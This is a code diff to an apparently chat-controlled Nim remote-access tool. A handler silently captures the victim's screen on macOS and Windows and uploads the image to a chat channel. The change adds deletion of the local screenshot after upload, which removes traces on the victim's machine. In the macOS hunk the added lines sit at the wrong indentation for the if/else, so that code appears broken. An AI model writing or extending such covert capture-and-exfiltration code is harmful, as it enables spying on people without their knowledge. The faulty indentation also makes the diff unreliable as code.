@@ -187,7 +187,9 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
       let (output, exitCode) = execCmdEx("screencapture -x " & filePath)
       if exitCode == 0 and fileExists(filePath):
         await sendFile(m.channel_id, filePath, fileName)
-        return "screenshot taken and sent!"
+      if fileExists(filePath):
+        removeFile(filePath)
+      return "screenshot taken, sent and deleted!"
       else:
         return "failed to take screenshot: " & output
     elif defined(windows):
@@ -206,7 +208,9 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
       let (output, exitCode) = execCmdEx(command)
       if exitCode == 0 and fileExists(filePath):
         await sendFile(m.channel_id, filePath, fileName)
-        return "Screenshot taken and sent!"
+        if fileExists(filePath):
+          removeFile(filePath)
+        return "Screenshot taken, sent and deleted!"
       else:
         return "failed to take screenshot: " & output
     else:
